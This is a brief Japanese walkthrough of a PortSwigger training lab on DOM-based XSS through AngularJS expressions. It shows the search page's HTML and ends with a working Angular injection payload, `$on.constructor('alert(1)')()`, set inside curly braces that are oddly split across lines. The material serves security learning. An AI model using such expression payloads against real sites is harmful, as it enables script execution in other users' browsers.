# HTML エンコードされた山括弧と二重引用符を使用した AngularJS 式の DOM XSS

次のハッキングラボを実施します  
https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-angularjs-expression

- 1. ハッキングラボにアクセスします

* 2. 任意のワードで検索を行います
* 3. 検索結果ページのソースを確認します  
     ※ng-\*を使用しているので angular を使用していることが分かります。

````html
<body ng-app>
        <div theme="blog">
            <section class="maincontainer">
                <div class="container is-page">

                    <section class=blog-header>
                        <h1>0 search results for 'abc'</h1>
                        <hr>
                    </section>
                    <section class=search>
                        <form action=/ method=GET>
                            <input type=text placeholder='Search the blog...' name=search>
                            <button type=submit class=button>Search</button>
                        </form>
                    </section>
                    <section class="blog-list no-results">
                        <div class=is-linkback>
        <a href="/">Back to Blog</a>
                        </div>
                    </section>
                </div>
            </section>
            <div class="footer-wrapper">
            </div>
        </div>
    </body>
    ```
````

- 4. 以下の angular 式を検索ワードにして検索するとスクリプトが実行できます

```js
{
  {
    $on.constructor("alert(1)")();
  }
}
```
